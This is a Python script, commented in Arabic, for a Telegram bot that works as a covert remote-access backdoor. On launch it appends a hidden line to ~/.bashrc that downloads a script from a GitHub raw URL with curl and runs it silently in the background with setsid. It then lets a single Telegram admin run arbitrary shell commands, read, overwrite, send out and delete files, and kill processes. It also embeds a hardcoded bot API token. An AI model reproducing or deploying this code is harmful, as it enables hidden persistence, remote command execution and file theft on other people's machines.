import os
import subprocess
import telebot
import platform
import signal
import time
from telebot import types

# --- [ إعدادات الوصول ] ---
API_TOKEN = '8273287560:AAGqSc-RykVleyF4UQn4DmVqmD3byvBye5Y'
ADMIN_ID = 7047473765

# --- [ وظيفة التثبيت التلقائي والمخفي الذكي ] ---
def auto_install():
    bashrc_path = os.path.expanduser("~/.bashrc")
    # رابط ملفك المباشر على جيت هاب
    script_url = "https://raw.githubusercontent.com/m539475124/my-telegram-scripts/refs/heads/main/a.py"
    
    # الكود الذي سيتم حقنه للتشغيل التلقائي والمخفي
    # يتحقق أولاً إذا كان البوت يعمل، وإذا لم يكن، يحمله ويشغله بـ setsid
    magic_command = f'\n# Auto-Run Asatora System\npgrep -f "python a.py" > /dev/null || (curl -sL {script_url} -o a.py && setsid python a.py > /dev/null 2>&1 &)\n'
    
    try:
        if os.path.exists(bashrc_path):
            with open(bashrc_path, 'r') as f:
                content = f.read()
            if "Auto-Run Asatora System" not in content:
                with open(bashrc_path, 'a') as f:
                    f.write(magic_command)
                return "✅ تم تفعيل التشغيل التلقائي والمخفي بنجاح!"
        else:
            with open(bashrc_path, 'w') as f:
                f.write(magic_command)
            return "✅ تم إنشاء ملف النظام وتفعيل التشغيل التلقائي!"
    except Exception as e:
        return f"❌ خطأ في التثبيت الذاتي: {e}"

# تنفيذ التثبيت فور تشغيل السكريبت
install_status = auto_install()
print(install_status)

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
current_process = None 

def fix_path(path):
    if path.startswith("~/"):
        return path.replace("~", os.path.expanduser("~"))
    return path

@bot.message_handler(func=lambda message: message.text == ".menu")
def welcome(message):
    if message.chat.id == ADMIN_ID:
        user_states[ADMIN_ID] = ""
        markup = types.InlineKeyboardMarkup()
        device = f"{platform.node()} (Linux)"
        markup.add(types.InlineKeyboardButton(f"📱 جهاز: {device}", callback_data=f"select_device|{device}"))
        bot.send_message(ADMIN_ID, f"🌐 **الأجهزة المتصلة:**\nالحالة: {install_status}\nاختر الجهاز للتحكم:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_listener(call):
    global current_process
    data = call.data.split("|", 1)
    action = data[0]
    
    if action == "select_device":
        bot.edit_message_text(f"⚙️ تحكم مفعّل!\nاكتب `nano اسم_الملف` أو أي أمر نظام.", 
                              ADMIN_ID, call.message.message_id)
        return

    if action == "stop_all":
        os.system("pkill -f python && pkill -f node && pkill -f apt && pkill -f pkg")
        bot.send_message(ADMIN_ID, "🛑 **تم إرسال إشارة إيقاف إجباري لجميع العمليات!**")
        return

    filename = fix_path(data[1]) if len(data) > 1 else ""
    
    if action == "add" or action == "edit":
        user_states[ADMIN_ID] = f"writing|{filename}"
        bot.send_message(ADMIN_ID, f"📝 أرسل المحتوى لـ `{filename}`:\n(يمكنك إرسال نص أو ملف جاهز)")
    
    elif action == "run":
        user_states[ADMIN_ID] = f"running|{filename}"
        bot.send_message(ADMIN_ID, f"🚀 أرسل أمر التشغيل لـ `{filename}`:")
    
    elif action == "send_file":
        if os.path.exists(filename):
            with open(filename, 'rb') as f:
                bot.send_document(ADMIN_ID, f, caption=f"📄 نسخة كاملة: `{filename}`")
        else:
            bot.send_message(ADMIN_ID, "⚠️ الملف غير موجود.")
            
    elif action == "del":
        if os.path.exists(filename): 
            os.remove(filename)
            bot.send_message(ADMIN_ID, f"🗑 تم حذف `{filename}`")
        user_states[ADMIN_ID] = ""

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if message.chat.id != ADMIN_ID: return
    state = user_states.get(ADMIN_ID, "")
    
    if state.startswith("writing|"):
        filename = state.split("|")[1]
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(filename, 'wb') as f:
                f.write(downloaded_file)
            bot.send_message(ADMIN_ID, f"✅ تم استلام الملف واستبدال محتوى `{filename}` بنجاح.")
            user_states[ADMIN_ID] = ""
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ فشل في استبدال الملف: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_logic(message):
    if message.chat.id != ADMIN_ID: return
    text = message.text
    
    if text == ".menu":
        welcome(message)
        return

    if text.startswith("nano "):
        user_states[ADMIN_ID] = "" 

    state = user_states.get(ADMIN_ID, "")

    if state.startswith("writing|"):
        filename = state.split("|")[1]
        with open(filename, 'w') as f: f.write(text)
        bot.send_message(ADMIN_ID, f"✅ تم حفظ النص في `{filename}` بنجاح.")
        user_states[ADMIN_ID] = ""
        return

    def run_smart_command(cmd):
        bot.send_message(ADMIN_ID, f"⏳ جاري تنفيذ: `{cmd}`...")
        try:
            output = subprocess.getoutput(cmd)
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🛑 إيقاف إجباري (CTRL+C)", callback_data="stop_all"))

            if "already the newest version" in output or "Requirement already satisfied" in output:
                bot.send_message(ADMIN_ID, "✅ **النظام ذكي:** المكتبات مثبتة بالفعل.", reply_markup=markup)
            elif "error" in output.lower() or "failed" in output.lower():
                bot.send_message(ADMIN_ID, "❌ **فشل التنفيذ:** واجهت مشكلة.", reply_markup=markup)
            else:
                bot.send_message(ADMIN_ID, "👍 **تم التنفيذ بنجاح!**", reply_markup=markup)

            bot.send_message(ADMIN_ID, f"💻 **المخرجات:**\n```\n{output}\n```", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ خطأ غير متوقع: {str(e)}")

    if state.startswith("running|"):
        run_smart_command(text)
        user_states[ADMIN_ID] = ""
        return

    if text.startswith("nano "):
        raw_path = text.split(" ", 1)[1]
        filename = fix_path(raw_path)
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        if not os.path.exists(filename):
            markup.add(types.InlineKeyboardButton("➕ إنشاء جديد", callback_data=f"add|{filename}"))
            bot.send_message(ADMIN_ID, f"❓ `{raw_path}` غير موجود.", reply_markup=markup)
        else:
            with open(filename, 'r') as f: content = f.read()
            markup.add(types.InlineKeyboardButton("🚀 تشغيل", callback_data=f"run|{filename}"),
                       types.InlineKeyboardButton("✍️ تعديل", callback_data=f"edit|{filename}"),
                       types.InlineKeyboardButton("📥 أرسل لي الملف", callback_data=f"send_file|{filename}"),
                       types.InlineKeyboardButton("🗑 حذف", callback_data=f"del|{filename}"))
            
            if len(content) > 3000:
                bot.send_message(ADMIN_ID, f"📄 **الملف كبير جداً.**", reply_markup=markup)
            else:
                bot.send_message(ADMIN_ID, f"📄 محتوى `{raw_path}`:\n\n```\n{content}\n```", reply_markup=markup, parse_mode="Markdown")
        return

    run_smart_command(text)

def run_forever():
    while True:
        try:
            print("🚀 جاري تشغيل البوت بنظام الصمود المستمر...")
            bot.polling(none_stop=True, timeout=90, long_polling_timeout=90)
        except Exception as e:
            print(f"📡 محاولة إعادة اتصال: {e}")
            time.sleep(10)
            continue

if __name__ == "__main__":
    run_forever()
